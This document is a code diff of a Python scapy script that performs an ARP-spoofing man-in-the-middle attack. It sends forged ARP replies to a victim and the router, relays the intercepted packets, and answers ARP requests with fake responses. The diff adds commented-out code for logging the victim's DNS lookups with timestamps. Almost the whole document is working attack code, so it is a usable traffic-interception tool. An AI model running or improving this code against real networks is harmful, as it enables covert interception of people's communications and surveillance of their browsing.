@@ -1,6 +1,8 @@
 from scapy.all import *
+from datetime import datetime
 
 DEVICE_MAC = get_if_hwaddr(conf.iface)
+DNS_CACHE = []
 
 class Device:
     def __init__(self,ip):
@@ -38,10 +40,16 @@ def route(packet, victim, router):
         elif packet[IP].dst == victim.ip and packet[Ether].src == router.mac:
             packet[Ether].src = DEVICE_MAC
             packet[Ether].dst = victim.mac
+        # if DNS in packet and packet[IP].dst == victim.ip:
+        #     query = packet[DNS].qd
+        #     if query != None:
+        #         domain = query.qname.decode()
+        #         DNS_CACHE.append((int(datetime.now().timestamp()),domain))
+        #         print(domain)
         try:
             sendp(packet,verbose=0)
         except (OSError, TypeError) as e:
-            print('Error re-routing incoming packet, skipping...')
+            print('Error re-routing packet, skipping...')
             print(len(packet),e)
     elif ARP in packet:
         if packet[ARP].op == 1 and packet[ARP].psrc == router.ip and packet[ARP].pdst == victim.ip:
@@ -51,7 +59,6 @@ def route(packet, victim, router):
                 print('Sending fake response')
             except (OSError, TypeError):
                 print('Error sending packet, skipping...')
-            # sendp(packet,verbose=0)
         elif packet[ARP].op == 1 and packet[ARP].psrc == victim.ip and packet[ARP].pdst == router.ip:
             print('ARP request coming from victim to router')
             try:
@@ -59,19 +66,19 @@ def route(packet, victim, router):
                 print('Sending fake response')
             except (OSError, TypeError):
                 print('Error sending packet, skipping...')
-            # sendp(packet,verbose=0)
     else:
         try:
             sendp(packet,verbose=0)
         except (OSError, TypeError) as e:
-            print('Error re-routing packet, skipping...')
-            print(len(packet),e)
+            # print('Error re-routing packet, skipping...')
+            # print(len(packet),e)
+            # Likely an error with packet length, just drop the packet
+            pass 
 
 def mitm(victim, router):
-    # Convert all MAC addresses to lowercase to keep consistency
     sendp(spoofed_reply(router.ip, victim.ip, victim.mac),verbose=0)
     sendp(spoofed_reply(victim.ip, router.ip, router.mac),verbose=0)
-    print('Packets sent')
+    print('Attack sent, intercepting communications...')
     sniff(iface=conf.iface, prn=lambda packet:route(packet, victim, router))
 
 if __name__ == '__main__':
